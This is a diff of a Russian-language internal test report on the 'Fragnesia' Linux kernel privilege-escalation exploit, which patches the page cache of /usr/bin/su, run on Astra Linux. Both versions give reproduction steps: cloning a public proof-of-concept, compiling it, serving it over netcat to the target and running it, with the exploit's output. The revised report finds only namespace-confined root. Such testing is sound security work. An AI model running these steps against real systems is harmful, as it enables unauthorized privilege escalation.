@@ -1,76 +1,75 @@
-# Тест эксплуатации Fragnesia (LPE via espintcp page cache replace)
+# Тест эксплойта Fragnesia (LPE via espintcp page cache replace)
 
-## Описание
-Тест проверяет локальное повышение привилегий (LPE) через уязвимость в механизме `espintcp_splice` и подмену страниц кэша. Эксплойт изменяет содержимое read-only страницы /usr/bin/su, внедряя shellcode, после чего при запуске su получается root-оболочка.
+## Что проверялось
+Попытка локального повышения привилегий с пользователя `ksb` (uid=1000) до `root` (uid=0) через уязвимость в ядре (подмена страниц кэша для `/usr/bin/su`).
 
-## Среда выполнения
-- ОС: Astra Linux 1.7_x86-64
-- Пользователь: ksb / astra (uid=1000)
-- Целевой бинарник: /usr/bin/su
-- IP-адрес: ***
+## Результат
+**НЕ УСПЕШНО** (частично)
 
-## Результат теста
-СТАТУС: УСПЕШНО
-Исходный пользователь: ksb (uid=1000)
-Полученный пользователь: root (uid=0)
+- `whoami` показывает `root`
+- `id` показывает `uid=0(root)`
+- НО: root работает внутри `userns` (user namespace)
+- Реального контроля над системой нет — `apt install`, запись в `/root`, нормальный шелл — НЕ РАБОТАЮТ
 
-### Вывод после эксплуатации
-bash: /root/.bashrc: Permission denied
-root@astra-1:/home/ksb/testLPE/crypt/pocs/fragnesia/pocs/fragnesia# whoami
-root
-root@astra-1:/home/ksb/testLPE/crypt/pocs/fragnesia/pocs/fragnesia# id
-uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
+Проверка:
+```
+cat /proc/self/uid_map
+0       1000          1
+```
 
-## Пошаговая инструкция для повторения
+Метка процесса осталась в исходном namespace, реальный root не получен.
 
-### Шаг 1. Клонирование и компиляция эксплойта
-Выполнить на машине, где есть доступ к интернету и gcc:
+## Как повторять
 
+### 1. Скачать эксплойт
+```
 git clone https://github.com/v12-security/pocs.git
 cd pocs/fragnesia
+```
+
+### 2. Скомпилировать
+```
 gcc -o exp fragnesia.c
+```
 
-### Шаг 2. Запуск netcat-сервера
-В отдельном терминале на той же машине (IP ***):
-
+### 3. Запустить слушатель (в другом терминале, на том же IP)
+```
 nc -l -p 1234 < exp
+```
 
-### Шаг 3. Получение и запуск на целевой системе
-На уязвимой машине (пользователь astra или ksb):
-
-nc *** 1234 > fragnesia
+### 4. На целевой машине (уязвимой) выполнить
+```
+nc IP_REMOVED 1234 > fragnesia
 chmod +x fragnesia
 ./fragnesia
-
-### Шаг 4. Альтернативный запуск (из репозитория)
-Если эксплойт уже скомпилирован локально:
-
-cd ~/testLPE/crypt/pocs/fragnesia
+```
+ИЛИ если компилировали прямо на цели:
+```
 ./exp
+```
 
-### Ожидаемый вывод при успехе
-[*] smashing 192 bytes into read-only page cache
-[==================================================] 192/192 (100%)
-[+] BUG: changed requested copied byte range to desired values
-[+] smashed XX -> 00  index=...
-bash: /root/.bashrc: Permission denied
-root@astra-1:~#
+## Что происходит при запуске (разбор вывода)
 
-## Важные замечания
-1. Полученный root работает внутри пользовательского пространства имён (userns)
-   Проверка: cat /proc/self/uid_map
-   0       1000          1
+1. Эксплойт ищет `/usr/bin/su` и подготавливает shellcode (192 байта)
+2. Пишет в `read-only page cache`:
+   ```
+   [*] smashing 192 bytes into read-only page cache
+   [==================================================] 192/192 (100%)
+   [+] BUG: changed requested copied byte range to desired values
+   ```
+3. После срабатывания `espintcp_splice` появляется приглашение `root@astra-1:...#
+4. Но сразу видно проблему:
+   ```
+   bash: /root/.bashrc: Permission denied
+   ```
+5. Дальше `apt install gcc` — ошибка:
+   ```
+   E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)
+   ```
+6. `ls -la /var/lib/dpkg/` показывает владельца `nobody:nogroup` — root внутри userns не может писать
 
-2. apt install не работает, т.к. /var/lib/dpkg принадлежит nobody:nogroup
-
-3. Для полного root вне userns требуется дополнительная эскалация или перезагрузка
-
-## Очистка системы
-Восстановление оригинального /usr/bin/su:
-- Перезагрузка ОС
-- Или перезапись из резервной копии
-- Или перемонтирование образа
+## Вывод
+Эксплойт **обманывает проверку UID**, но не даёт реального контроля над системой. Для практического использования непригоден.
 
 ## Источник
-Эксплойт от v12-security
 https://github.com/v12-security/pocs/tree/main/fragnesia
